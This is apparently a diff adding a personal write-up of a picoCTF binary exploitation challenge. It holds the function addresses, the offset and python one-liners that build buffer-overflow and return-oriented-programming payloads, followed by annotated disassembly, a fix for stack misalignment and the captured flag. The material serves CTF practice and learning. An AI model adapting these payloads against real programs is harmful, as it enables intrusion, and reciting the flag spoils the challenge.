@@ -1,0 +1,76 @@
+win_fn1: 0x400767
+win_fn2: 0x400781
+win_fn:  0x4007be
+
+args for win_fn2()
+0xBAADCAFE
+0xCAFEBABE
+0xABADBABE
+
+offset: 72
+
+exploit for win_fn()
+python -c "print('\x90'*72 + '\x67\x07\x40\x00\x00\x00\x00\x00' + '\x90'*8 + '\xef\xbe\xad\xde\x00\x00\x00\x00')" > ~/explt
+
+exploit for win_fn2()
+python -c "print('\x90'*72+'\x81\x07\x40\x00\x00\x00\x00\x00'+'\x90'*8+'\xbe\xba\xad\xab\x00\x00\x00\x00\xbe\xba\xfe\xca\x00\x00\x00\x00\xfe\xca\xad\xba\x00\x00\x00\x00')" > ~/explt2
+
+exploit to go to win_fn
+python -c "print('\x90'*72 + '\xbe\x07\x40\x00\x00\x00\x00\x00')" > ~/explt3
+
+***************************
+We can actually:
+skip calling the win_fn1, win_fn2 and passing arguments in.
+we can jump directly to the code where it sets the global vars to true, then call the win_fn
+
+0000000000400767 <win_fn1>:
+  400767:       55                      push   rbp
+  400768:       48 89 e5                mov    rbp,rsp
+  40076b:       89 7d fc                mov    DWORD PTR [rbp-0x4],edi
+  40076e:       81 7d fc ef be ad de    cmp    DWORD PTR [rbp-0x4],0xdeadbeef
+  400775:       75 07                   jne    40077e <win_fn1+0x17>
+  400777:       c6 05 fb 08 20 00 01    mov    BYTE PTR [rip+0x2008fb],0x1        # 601079 <win1>
+  40077e:       90                      nop
+  40077f:       5d                      pop    rbp
+  400780:       c3                      ret
+
+We can jump to: 0x400777
+
+0000000000400781 <win_fn2>:
+  400781:       55                      push   rbp
+  400782:       48 89 e5                mov    rbp,rsp
+  400785:       89 7d fc                mov    DWORD PTR [rbp-0x4],edi
+  400788:       89 75 f8                mov    DWORD PTR [rbp-0x8],esi
+  40078b:       89 55 f4                mov    DWORD PTR [rbp-0xc],edx
+  40078e:       0f b6 05 e4 08 20 00    movzx  eax,BYTE PTR [rip+0x2008e4]        # 601079 <win1>
+  400795:       84 c0                   test   al,al
+  400797:       74 22                   je     4007bb <win_fn2+0x3a>
+  400799:       81 7d fc fe ca ad ba    cmp    DWORD PTR [rbp-0x4],0xbaadcafe
+  4007a0:       75 19                   jne    4007bb <win_fn2+0x3a>
+  4007a2:       81 7d f8 be ba fe ca    cmp    DWORD PTR [rbp-0x8],0xcafebabe
+  4007a9:       75 10                   jne    4007bb <win_fn2+0x3a>
+  4007ab:       81 7d f4 be ba ad ab    cmp    DWORD PTR [rbp-0xc],0xabadbabe
+  4007b2:       75 07                   jne    4007bb <win_fn2+0x3a>
+  4007b4:       c6 05 bf 08 20 00 01    mov    BYTE PTR [rip+0x2008bf],0x1        # 60107a <win2>
+  4007bb:       90                      nop
+  4007bc:       5d                      pop    rbp
+  4007bd:       c3                      ret
+
+We can jump to: 0x4007b4
+
+Now, win1 and win2 global vars should be set to True
+
+00000000004007be <win_fn>:
+Jump to 0x4007be to win_fn
+
+should be good, we also have to add padding between functions.
+
+python -c "print('\x90'*72 + '\x77\x07\x40\0\0\0\0\0' + '\x90'*8 + '\xb4\x07\x40\0\0\0\0\0' + '\x90'*8 + '\xbe\x07\x40\0\0\0\0\0')" > ~/exploit
+
+OKAY, so the above exploit didn't work, since the stack is misaligned. It is recommended to jump to some return first, (after the nops), then ....
+
+We jump to the return of win_fn: 0x40084c :to align the stack
+python -c "print('\x90'*72 +'\x4c\x08\x40\0\0\0\0\0'+'\x90'*8+'\x77\x07\x40\0\0\0\0\0'+'\x90'*8+'\x4b\x07\x40\0\0\0\0\0'+'\x90'*8+'\xbe\x07\x40\0\0\0\0\0')" > ~/exploit
+
+got flag: picoCTF{r0p_1t_d0nT_st0p_1t_e51a1ea0}
+
